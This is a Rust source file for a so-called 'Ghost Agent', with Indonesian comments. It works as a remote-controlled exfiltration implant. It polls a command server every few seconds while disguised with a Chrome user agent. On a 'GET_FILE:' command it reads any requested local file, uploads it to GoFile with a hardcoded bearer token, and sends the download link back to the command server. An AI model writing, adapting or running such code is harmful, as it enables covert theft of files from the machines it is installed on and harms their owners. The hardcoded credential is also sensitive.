use std::time::Duration;
use std::path::Path;
use tokio::time::sleep;
use tokio::fs::File;
use tokio_util::codec::{BytesCodec, FramedRead};
use reqwest::Client;
use serde::Deserialize;
use serde_json::json;

// --- KONFIGURASI ---
const API_URL: &str = "https://erzysh.vercel.app/api/ghost"; 
const GOFILE_TOKEN: &str = "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy"; 

// --- STRUCT RESPONSE ---
#[derive(Deserialize, Debug)]
struct GoFileUploadResponse {
    status: String,
    data: Option<UploadData>,
}

#[derive(Deserialize, Debug)]
struct UploadData {
    #[serde(rename = "downloadPage")]
    download_page: String,
}

#[derive(Deserialize)]
struct CommandResponse {
    #[serde(rename = "messageId")]
    message_id: Option<String>,
    command: Option<String>,
}

#[tokio::main]
async fn main() {
    println!("👻 Ghost Agent Active (GoFile Singapore Node)...");
    
    // User-Agent Chrome
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .unwrap();

    loop {
        match fetch_command(&client).await {
            Ok(Some((msg_id, cmd))) => {
                println!("📩 Perintah: {}", cmd);
                if cmd.starts_with("GET_FILE:") {
                    let path = cmd.trim_start_matches("GET_FILE:");
                    handle_file_request(&client, path, &msg_id).await;
                }
            }
            Err(e) => println!("⚠️ Fetch error: {}", e),
            _ => {}
        }
        sleep(Duration::from_secs(3)).await;
    }
}

async fn fetch_command(client: &Client) -> Result<Option<(String, String)>, Box<dyn std::error::Error>> {
    let resp = client.get(API_URL).send().await?;
    if resp.status().is_success() {
        let text = resp.text().await?;
        if text.trim().is_empty() || text == "null" { return Ok(None); }
        
        if let Ok(data) = serde_json::from_str::<CommandResponse>(&text) {
            if let (Some(mid), Some(cmd)) = (data.message_id, data.command) {
                return Ok(Some((mid, cmd)));
            }
        }
    }
    Ok(None)
}

async fn handle_file_request(client: &Client, path_str: &str, msg_id: &str) {
    let path = Path::new(path_str);
    if !path.exists() {
        let err = format!("❌ File gak ketemu: {}", path_str);
        println!("{}", err);
        report_result(client, msg_id, &err).await;
        return;
    }

    println!("🚀 Uploading ke Singapore Server...");
    match upload_to_gofile(client, path_str).await {
        Ok(url) => {
            println!("✅ Sukses! Link: {}", url);
            report_result(client, msg_id, &url).await;
        },
        Err(e) => {
            // Print error raw biar ketahuan
            let err = format!("❌ Upload Gagal: {}", e);
            println!("{}", err);
            report_result(client, msg_id, &err).await;
        }
    }
}

async fn upload_to_gofile(client: &Client, file_path: &str) -> Result<String, Box<dyn std::error::Error>> {
    // URL Sesuai Dokumentasi (Regional Singapore)
    let upload_url = "https://upload-ap-sgp.gofile.io/uploadFile";
    
    let file = File::open(file_path).await?;
    let stream = FramedRead::new(file, BytesCodec::new());
    let file_body = reqwest::Body::wrap_stream(stream);
    let filename = Path::new(file_path).file_name().unwrap().to_string_lossy().to_string();

    // Form data hanya butuh file, token ditaruh di HEADER sesuai docs baru
    let form = reqwest::multipart::Form::new()
        .part("file", reqwest::multipart::Part::stream(file_body).file_name(filename));

    let upload_resp = client.post(upload_url)
        .header("Authorization", format!("Bearer {}", GOFILE_TOKEN)) // <--- PENTING
        .multipart(form)
        .send()
        .await?;

    let raw_upload_body = upload_resp.text().await?;
    
    // Debugging: uncomment kalau mau liat respon asli
    // println!("Raw Response: {}", raw_upload_body);

    let upload_json: GoFileUploadResponse = serde_json::from_str(&raw_upload_body)
        .map_err(|e| format!("Parsing Error. Server jawab: {}", raw_upload_body))?;

    if upload_json.status == "ok" {
        if let Some(data) = upload_json.data {
            return Ok(data.download_page);
        }
    }

    Err(format!("Status not ok: {}", raw_upload_body).into())
}

async fn report_result(client: &Client, reply_to_id: &str, data: &str) {
    let _ = client.post(API_URL)
        .json(&json!({
            "action": "report_result",
            "replyToId": reply_to_id,
            "data": data
        }))
        .send().await;
}